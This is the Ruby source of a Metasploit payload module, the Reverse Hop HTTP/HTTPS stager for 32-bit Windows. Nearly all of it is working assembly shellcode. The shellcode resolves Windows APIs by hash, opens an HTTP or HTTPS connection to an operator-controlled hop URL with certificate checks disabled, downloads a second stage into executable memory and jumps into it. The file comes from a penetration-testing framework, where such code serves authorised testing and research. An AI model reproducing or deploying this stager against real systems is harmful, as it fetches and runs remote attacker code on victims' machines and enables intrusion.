##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'
require 'msf/core/handler/reverse_hop_http'

module MetasploitModule

  CachedSize = 353

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def initialize(info = {})
    super(merge_info(info,
      'Name'           => 'Reverse Hop HTTP/HTTPS Stager',
      'Description'    => %q{
        Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload
        data/hop/hop.php to the PHP server you wish to use as a hop.
      },
      'Author'         => [
         'scriptjunkie <scriptjunkie[at]scriptjunkie.us>',
         'bannedit',
         'hdm'
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Handler'        => Msf::Handler::ReverseHopHttp,
      'Convention'     => 'sockedi http',
      'DefaultOptions' => { 'WfsDelay' => 30 },
      'Stager'         => { 'Offsets' => { } }))

    deregister_options('LHOST', 'LPORT')

    register_options([
      OptString.new('HOPURL', [ true, "The full URL of the hop script", "http://example.com/hop.php" ]
      )
    ])
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTP
  #
  def stage_over_connection?
    false
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    config = transport_config_reverse_http(opts)
    config[:scheme] = URI(datastore['HOPURL']).scheme
    config
  end

  #
  # Generate the first stage
  #
  def generate
    uri = URI(datastore['HOPURL'])
    #create actual payload
    payload_data = <<EOS
  cld            ; clear direction flag
  call start        ; start main routine
; Stephen Fewer's block_api
; block_api code (Stephen Fewer)
api_call:
  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
  mov ebp, esp           ; Create a new stack frame
  xor edx, edx           ; Zero EDX
  mov edx, fs:[edx+48]   ; Get a pointer to the PEB
  mov edx, [edx+12]      ; Get PEB->Ldr
  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
next_mod:
  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
  movzx ecx, word [edx+38] ; Set ECX to the length we want to check
  xor edi, edi           ; Clear EDI which will store the hash of the module name
loop_modname:            ;
  xor eax, eax           ; Clear EAX
  lodsb                  ; Read in the next byte of the name
  cmp al, 'a'            ; Some versions of Windows use lower case module names
  jl not_lowercase       ;
  sub al, 0x20           ; If so normalise to uppercase
not_lowercase:           ;
  ror edi, 13            ; Rotate right our hash value
  add edi, eax           ; Add the next byte of the name
  loop loop_modname      ; Loop until we have read enough
  ; We now have the module hash computed
  push edx               ; Save the current position in the module list for later
  push edi               ; Save the current module hash for later
  ; Proceed to iterate the export address table,
  mov edx, [edx+16]      ; Get this modules base address
  mov eax, [edx+60]      ; Get PE header
  add eax, edx           ; Add the modules base address
  mov eax, [eax+120]     ; Get export tables RVA
  test eax, eax          ; Test if no export address table is present
  jz get_next_mod1       ; If no EAT present, process the next module
  add eax, edx           ; Add the modules base address
  push eax               ; Save the current modules EAT
  mov ecx, [eax+24]      ; Get the number of function names
  mov ebx, [eax+32]      ; Get the rva of the function names
  add ebx, edx           ; Add the modules base address
  ; Computing the module hash + function hash
get_next_func:           ;
  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards) process next mod
  dec ecx                ; Decrement the function name counter
  mov esi, [ebx+ecx*4]   ; Get rva of next module name
  add esi, edx           ; Add the modules base address
  xor edi, edi           ; Clear EDI which will store the hash of the function name
  ; And compare it to the one we want
loop_funcname:           ;
  xor eax, eax           ; Clear EAX
  lodsb                  ; Read in the next byte of the ASCII function name
  ror edi, 13            ; Rotate right our hash value
  add edi, eax           ; Add the next byte of the name
  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname      ; If we have not reached the null terminator, continue
  add edi, [ebp-8]       ; Add the current module hash to the function hash
  cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
  jnz get_next_func      ; Go compute the next function hash if we have not found it
  ; If found, fix up stack, call the function and then value else compute the next one...
  pop eax                ; Restore the current modules EAT
  mov ebx, [eax+36]      ; Get the ordinal table rva
  add ebx, edx           ; Add the modules base address
  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
  mov ebx, [eax+28]      ; Get the function addresses table rva
  add ebx, edx           ; Add the modules base address
  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
  add eax, edx           ; Add the modules base address to get the functions actual VA
  ; We now fix up the stack and perform the call to the desired function...
finish:
  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address
  pop ebx                ; Clear off the current modules hash
  pop ebx                ; Clear off the current position in the module list
  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX
  pop ecx                ; Pop off the origional return address our caller will have pushed
  pop edx                ; Pop off the hash value our caller will have pushed
  push ecx               ; Push back the correct return value
  jmp eax                ; Jump into the required function
  ; We now automagically return to the correct caller...
get_next_mod:            ;
  pop eax                ; Pop off the current (now the previous) modules EAT
get_next_mod1:           ;
  pop edi                ; Pop off the current (now the previous) modules hash
  pop edx                ; Restore our position in the module list
  mov edx, [edx]         ; Get the next module
  jmp.i8 next_mod        ; Process this module

; actual routine
start:
  pop ebp            ; get ptr to block_api routine

; Input: EBP must be the address of 'api_call'.
; Output: EDI will be the socket for the connection to the server
; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
load_wininet:
  push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
  push 0x696e6977        ; ...
  push esp               ; Push a pointer to the "wininet" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "wininet" )

internetopen:
  xor edi,edi
  push edi               ; DWORD dwFlags
  push edi               ; LPCTSTR lpszProxyBypass
  push edi               ; LPCTSTR lpszProxyName
  push edi               ; DWORD dwAccessType (PRECONFIG = 0)
  push 0                 ; NULL pointer
  push esp               ; LPCTSTR lpszAgent ("\x00")
  push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
  call ebp

  jmp.i8 dbl_get_server_host

internetconnect:
  pop ebx                ; Save the hostname pointer
  xor ecx, ecx
  push ecx               ; DWORD_PTR dwContext (NULL)
  push ecx               ; dwFlags
  push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
  push ecx               ; password
  push ecx               ; username
  push #{uri.port} ; PORT
  push ebx               ; HOSTNAME
  push eax               ; HINTERNET hInternet
  push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
  call ebp

  jmp get_server_uri

httpopenrequest:
  pop ecx
  xor edx, edx           ; NULL
  push edx               ; dwContext (NULL)
EOS

    if uri.scheme == 'http'
      payload_data << '  push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
    else
      payload_data << '  push (0x80000000 | 0x00800000 | 0x00001000 | 0x00002000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
    end
    # 0x80000000 |        ; INTERNET_FLAG_RELOAD
    # 0x00800000 |        ; INTERNET_FLAG_SECURE
    # 0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
    # 0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
    # 0x80000000 |        ; INTERNET_FLAG_RELOAD
    # 0x04000000 |        ; INTERNET_NO_CACHE_WRITE
    # 0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
    # 0x00000200 |        ; INTERNET_FLAG_NO_UI
    # 0x00400000          ; INTERNET_FLAG_KEEP_CONNECTION
    payload_data << <<EOS

  push edx               ; accept types
  push edx               ; referrer
  push edx               ; version
  push ecx               ; url
  push edx               ; method
  push eax               ; hConnection
  push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
  call ebp
  mov esi, eax           ; hHttpRequest

set_retry:
  push 0x10
  pop ebx

httpsendrequest:
  xor edi, edi
  push edi               ; optional length
  push edi               ; optional
  push edi               ; dwHeadersLength
  push edi               ; headers
  push esi               ; hHttpRequest
  push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
  call ebp
  test eax,eax
  jnz allocate_memory

try_it_again:
  dec ebx
  jz failure

EOS
    if uri.scheme == 'https'
      payload_data << <<EOS
set_security_options:
  push 0x00003380
    ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
    ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
    ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
    ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
    ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
  mov eax, esp
  push 0x04                 ; sizeof(dwFlags)
  push eax               ; &dwFlags
  push 0x1f              ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
  push esi               ; hRequest
  push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
  call ebp

EOS
  end
  payload_data << <<EOS
  jmp.i8 httpsendrequest

dbl_get_server_host:
  jmp get_server_host

get_server_uri:
  call httpopenrequest

server_uri:
 db "#{Rex::Text.hexify(uri.request_uri, 99999).strip}?/12345", 0x00

failure:
  push 0x56A2B5F0        ; hardcoded to exitprocess for size
  call ebp

allocate_memory:
  push 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push 0x00400000        ; Stage allocation (8Mb ought to do us)
  push edi               ; NULL as we dont care where the allocation is
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

download_prep:
  xchg eax, ebx          ; place the allocated base address in ebx
  push ebx               ; store a copy of the stage base address on the stack
  push ebx               ; temporary storage for bytes read count
  mov edi, esp           ; &bytesRead

download_more:
  push edi               ; &bytesRead
  push 8192              ; read length
  push ebx               ; buffer
  push esi               ; hRequest
  push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
  call ebp

  test eax,eax           ; download failed? (optional?)
  jz failure

  mov eax, [edi]
  add ebx, eax           ; buffer += bytes_received

  test eax,eax           ; optional?
  jnz download_more      ; continue until it returns 0
  pop eax                ; clear the temporary storage

execute_stage:
  ret                    ; dive into the stored stage address

get_server_host:
  call internetconnect

server_host:
db "#{Rex::Text.hexify(uri.host, 99999).strip}", 0x00

EOS
    self.module_info['Stager']['Assembly'] = payload_data.to_s
    super
  end
end
